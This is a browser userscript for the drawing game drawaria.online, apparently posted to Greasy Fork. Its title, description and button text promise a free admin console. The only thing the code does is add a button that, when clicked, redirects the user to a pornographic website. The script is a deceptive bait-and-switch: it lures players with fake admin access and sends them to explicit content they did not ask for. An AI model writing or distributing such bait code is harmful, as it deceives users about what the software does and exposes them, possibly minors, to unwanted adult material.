// ==UserScript==
// @name         free admin bul bul bul
// @version      1.0
// @description  Get Free Admin Console in drawaria
// @autor        minish
// @namespace    drawaria.bad.site
// @match        https://drawaria.online/*
// @icon         https://avatars.mds.yandex.net/i?id=8a612a95f6c487f413ccb39d2dbc5b830607620c-4055806-images-thumbs&n=13
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/521480/free%20admin%20bul%20bul%20bul.user.js
// @updateURL https://update.greasyfork.org/scripts/521480/free%20admin%20bul%20bul%20bul.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // Create the button
    const button = document.createElement('button');
    button.id = 'getFreeAdminConsole';
    button.type = 'button';
    button.innerHTML = 'Get Free Admin Console'; // Button text
    button.style.padding = '10px';
    button.style.margin = '20px';
    button.title = 'Click to get free admin console';
    document.body.appendChild(button);

    // Click handler for the button
    button.onclick = function() {
        // Redirect to the specified site
        window.location.href = 'https://www.pornhub.com'; // Redirect to Pornhub
    };
})();
